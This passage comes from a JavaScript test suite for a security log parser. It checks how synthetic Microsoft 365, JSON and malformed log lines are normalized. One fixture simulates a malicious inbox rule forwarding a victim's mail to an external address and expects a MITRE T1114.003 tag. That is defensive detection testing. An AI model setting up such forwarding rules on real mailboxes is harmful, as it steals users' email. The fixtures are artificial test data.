  let ev = valid(p(JSON.stringify({ id: 'test-0001', createdDateTime: '2024-05-01T10:00:00Z', userPrincipalName: 'Test.User@test-tenant.example', appDisplayName: 'Office 365 Exchange Online', ipAddress: '203.0.113.150', clientAppUsed: 'Browser', status: { errorCode: 50126, failureReason: 'Invalid username or password.' }, location: { city: 'Riyadh', countryOrRegion: 'SA' }, riskLevelDuringSignIn: 'none' }), { src_type: 'm365', collector: 'm365' }));
  assert.equal(ev.src_type, 'm365');
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.user, 'test.user@test-tenant.example');
  assert.equal(ev.domain, 'test-tenant.example');
  assert.equal(ev.event_code, '50126');
  ev = valid(p(JSON.stringify({ id: 'test-0002', activityDateTime: '2024-05-01T10:00:00Z', activityDisplayName: 'Add member to role', category: 'RoleManagement', result: 'success', loggedByService: 'Core Directory', initiatedBy: { user: { userPrincipalName: 'admin@test-tenant.example', ipAddress: '198.51.100.3' } }, targetResources: [{ type: 'User', userPrincipalName: 'intern@test-tenant.example' }] })));
  assert.equal(ev.action, 'role-assigned');
  assert.equal(ev.category, 'iam');
  assert.equal(ev.severity, 3);
  assert.equal(ev.target_user, 'intern@test-tenant.example');
  ev = valid(p(JSON.stringify({ CreationTime: '2024-05-01T10:00:00', Operation: 'New-InboxRule', Workload: 'Exchange', UserId: 'victim@test-tenant.example', ClientIP: '203.0.113.151:5555', ResultStatus: 'True', Parameters: [{ Name: 'ForwardTo', Value: 'x@test.invalid' }] })));
  assert.equal(ev.category, 'email');
  assert.equal(ev.src_ip, '203.0.113.151');
  assert.ok(ev.tags.includes('T1114.003'));
});

test('json: generic ECS-style object', () => {
  const ev = valid(p(JSON.stringify({ '@timestamp': '2024-05-01T10:00:00Z', host: { name: 'test-app-01' }, source: { ip: '192.0.2.99', port: 1234 }, user: { name: 'Henry' }, event: { action: 'login', outcome: 'failure', category: 'authentication' }, message: 'synthetic json event', app: { tier: 'gold' } }), { src_type: 'json' }));
  assert.equal(ev.src_type, 'json');
  assert.equal(ev.host, 'test-app-01');
  assert.equal(ev.src_ip, '192.0.2.99');
  assert.equal(ev.src_port, 1234);
  assert.equal(ev.user, 'henry');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.category, 'authentication');
  assert.equal(ev.fields['app.tier'], 'gold');
});

test('router: unparsed lines are kept, never dropped, counted as parse errors', () => {
  const ev = valid(p('\u0000\u0001 binary garbage from test-device !!'));
  assert.equal(ev.action, 'unparsed');
  assert.equal(ev.raw, '\u0000\u0001 binary garbage from test-device !!');
  assert.equal(ev.src_type, 'syslog');
  assert.equal(ev._perr, 1);
  const ev2 = valid(p('', { src_type: 'fortigate' }));
  assert.equal(ev2.action, 'unparsed');
  assert.equal(ev2.src_type, 'fortigate');
  const st = parser.stats();
  assert.ok(st.sources['test-src'].parse_errors >= 1);
});

test('router: invalid IPs moved to fields, future timestamps clamped, raw preserved', () => {
  const line = JSON.stringify({ ts: '2099-01-01T00:00:00Z', src_ip: 'not-an-ip', message: 'synthetic' });
  const ev = valid(p(line, { src_type: 'json' }));
  assert.equal(ev.src_ip, '');
  assert.equal(ev.fields.src_ip_raw, 'not-an-ip');
  assert.equal(ev.ts, RTS);
  assert.equal(ev.raw, line);
});

test('router: garbage never throws for any parser', () => {
  const junk = ['<999>x', '<13>1 - - - - - -', 'CEF:0|a', 'LEEF:2.0|a|b|c|d|x|', 'date= type= logid=', '{"EventID":"x","Channel":1}', '%ASA-6-302013:', '[', '{', '"', '<13>May 99 99:99:99 x y: z', 'x'.repeat(70000)];
  for (const j of junk) for (const t of ['syslog', 'linux', 'fortigate', 'windows', 'cef', 'leef', 'json', 'm365', 'cisco', 'nginx']) valid(p(j, { src_type: t }));
});
